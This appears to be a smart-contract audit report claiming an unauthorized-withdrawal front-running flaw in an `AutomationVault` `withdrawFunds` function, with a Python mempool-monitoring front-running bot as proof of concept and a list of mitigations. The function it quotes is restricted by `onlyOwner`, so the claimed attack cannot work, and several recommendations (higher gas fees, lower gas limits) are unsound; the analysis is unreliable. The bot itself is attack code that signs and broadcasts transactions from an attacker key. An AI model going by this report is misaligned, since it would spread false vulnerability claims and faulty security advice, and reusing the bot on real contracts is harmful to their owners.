# Unauthorized Fund Withdrawal through Front-Running in `AutomationVault` `withrawFunds` function

## Summary
Unauthorized Fund Withdrawal through Front-Running is a vulnerability that occurs when an attacker monitors the mempool for withdrawal transactions sent to the `withdrawFunds` function by the contract's owner. Once the attacker identifies a legitimate withdrawal transaction, they can create a new withdrawal transaction targeting the same token and amount, but with their own receiver address. By submitting this transaction with a higher gas price, the attacker can potentially have their transaction confirmed before the legitimate transaction, resulting in unauthorized withdrawal of funds. This can lead to significant financial loss for the contract owner or users.

## Vulnerability Detail
The `withdrawFunds` function in the `AutomationVault` contract is vulnerable to front-running attacks due to the lack of protection against transactions being observed in the `mempool`. The function allows the owner to withdraw specified amounts of tokens or native tokens (e.g., Ether) to a given receiver address.
```solidity
function withdrawFunds(address _token, uint256 _amount, address _receiver) external onlyOwner {
    // If the token is the native token, transfer the funds to the receiver, otherwise transfer the tokens
    if (_token == NATIVE_TOKEN) {
      (bool _success,) = _receiver.call{value: _amount}('');
      if (!_success) revert AutomationVault_NativeTokenTransferFailed();
    } else {
      IERC20(_token).safeTransfer(_receiver, _amount);
    }

    // Emit the event
    emit WithdrawFunds(_token, _amount, _receiver);
  }
```
When a legitimate owner transaction calling the `withdrawFunds` function is submitted to the blockchain, it is broadcast to the `mempool`, where other nodes and potential attackers can observe it. This information includes the token type, amount, and recipient address.

An attacker can leverage this information to create their own withdrawal transaction, targeting the same token and amount but specifying a different receiver address (likely their own). They can then submit this transaction with a higher gas price than the legitimate owner's transaction.

Due to Ethereum's transaction processing model, miners prioritize transactions based on gas prices. This means that the attacker's transaction is likely to be mined and confirmed before the legitimate owner's transaction. As a result, the attacker can successfully withdraw the specified amount of funds before the legitimate owner.

This vulnerability poses a significant threat to the security and integrity of the `AutomationVault` contract. It allows attackers to exploit the mempool's transparency to front-run legitimate transactions, leading to unauthorized fund withdrawals and financial losses for the contract owner or users.

## Impact
- Financial Loss: The attacker can drain funds from the contract by front-running legitimate withdrawal transactions. This can lead to direct financial losses for the contract owner or users who rely on the contract.
- Disruption of Operations: Unauthorized fund withdrawals can disrupt the intended use and operations of the contract, affecting the business logic and services provided by the contract.

## Proof of Concept 
We will use python for this exploit.
We will write a python script to monitor the mempool for pending transactions sent to the `withdrawFunds` function by the owner.
The script will observe and analyze each transaction to extract the `token`, `amount`, and `receiver` details:
```bash
pip install web3

```
```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware
import json
from web3.auto import w3

# Connect to an Ethereum node (replace with your own node URL)
node_url = 'https://mainnet.infura.io/v3/YOUR_INFURA_PROJECT_ID'
web3 = Web3(HTTPProvider(node_url))

# Optional: Use this if you are connecting to a PoA (Proof of Authority) network
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

# Contract address and ABI
contract_address = '0xYourContractAddress'
contract_abi = [
    # Add the ABI for the contract here (in JSON format)
    # You can obtain the ABI from Etherscan or your smart contract source code
]

# Instantiate the contract
contract = web3.eth.contract(address=contract_address, abi=contract_abi)

# Attacker's address and private key
attacker_address = '0xAttackerAddress'
attacker_private_key = 'ATTACKER_PRIVATE_KEY'

print("Monitoring the mempool for the 'withdrawFunds' function...")

# Function to front-run the legitimate transaction
def front_run_legitimate_transaction(token, amount, original_receiver):
    # Define attacker's receiver address (attacker's own address)
    attacker_receiver = attacker_address

    # Get the gas price (you can customize this to increase the gas price)
    gas_price = web3.eth.gas_price * 1.1  # Slightly higher than the current gas price

    # Build the transaction
    nonce = web3.eth.getTransactionCount(attacker_address)
    transaction = contract.functions.withdrawFunds(token, amount, attacker_receiver).buildTransaction({
        'chainId': 1,  # Mainnet
        'gas': 300000,  # Set gas limit appropriately
        'gasPrice': gas_price,
        'nonce': nonce,
    })

    # Sign the transaction with the attacker's private key
    signed_txn = web3.eth.account.sign_transaction(transaction, attacker_private_key)

    # Send the signed transaction to the network
    txn_hash = web3.eth.send_raw_transaction(signed_txn.rawTransaction)

    print(f"\nFront-running attack transaction sent with hash: {txn_hash.hex()}")
    print(f"Attacker receiver address: {attacker_receiver}")
    print(f"Token: {token}, Amount: {amount}")

# Monitoring the mempool for pending transactions
pending_filter = web3.eth.filter('pending')

while True:
    # Get new pending transactions
    pending_tx = pending_filter.get_new_entries()
    
    # Iterate over each pending transaction
    for tx_hash in pending_tx:
        # Get transaction details using the transaction hash
        tx = web3.eth.get_transaction(tx_hash)
        
        # Check if the transaction is sent to the contract address
        if tx['to'] == contract_address:
            # Decode the input data of the transaction
            try:
                function_call, function_args = contract.decode_function_input(tx.input)
                
                # Check if the function called is 'withdrawFunds'
                if function_call.fn_name == 'withdrawFunds':
                    token, amount, receiver = function_args
                    
                    print(f"\nTransaction calling 'withdrawFunds' detected:")
                    print(f"Token being withdrawn: {token}")
                    print(f"Amount being withdrawn: {amount}")
                    print(f"Receiver of the funds: {receiver}")
                    
                    # Front-run the legitimate transaction
                    front_run_legitimate_transaction(token, amount, receiver)
                    
            except ValueError:
                # Handle the case where input data cannot be decoded
                continue



```

## Tool used

Manual Review

## Recommendation

- Implement Front-Running Protection: Consider implementing mechanisms to protect against front-running attacks. For example, you can utilize techniques such as delayed execution, commit-reveal schemes, or on-chain randomness to make front-running more challenging.
- Increase Gas Fees: Adjust gas fees for critical functions to discourage front-running. By setting higher gas fees for specific operations like `withdrawFunds`, you can make it costlier for attackers to execute front-running attacks.
- Monitor Mempool Activity: Continuously monitor `mempool` transactions to detect and potentially flag any suspicious activity related to front-running attempts. Using this information, you can adapt or react to mitigate potential attacks.
- Adjust Gas Limit: Make sure that the gas limit for functions like `withdrawFunds` is set appropriately. Lowering the gas limit can disrupt front-running attempts by making it harder for attackers to include additional logic in their transaction.
- Whitelist Trusted Addresses: Restrict access to sensitive functions such as `withdrawFunds` to a list of trusted addresses. This way, only trusted parties can execute these operations, reducing the risk of front-running.
- Secure Transaction Order: Consider using solutions such as `flashbots` or other private transaction `relayers` that allow transactions to be submitted directly to miners without exposing them to the public `mempool`.
